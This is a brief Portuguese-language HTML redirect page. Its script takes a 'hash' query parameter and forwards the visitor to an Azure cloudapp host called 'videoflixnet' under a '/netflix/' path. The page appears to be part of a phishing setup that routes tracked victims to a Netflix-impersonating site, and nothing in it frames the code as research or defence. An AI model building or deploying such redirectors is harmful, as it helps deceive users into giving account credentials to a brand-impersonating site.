<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Redirecionando...</title>
  <script>
    function getQueryParam(param) {
      const params = new URLSearchParams(window.location.search);
      return params.get(param);
    }

    const hashValue = getQueryParam("hash");

    if (hashValue) {
      const destino = `http://videoflixnet.canadacentral.cloudapp.azure.com/netflix/?hash=${encodeURIComponent(hashValue)}`;
      window.location.replace(destino);
    } else {
      document.write("<h2>Parâmetro 'hash' não encontrado.</h2>");
    }
  </script>
</head>
<body>
  <p>Redirecionando, aguarde...</p>
</body>
</html>
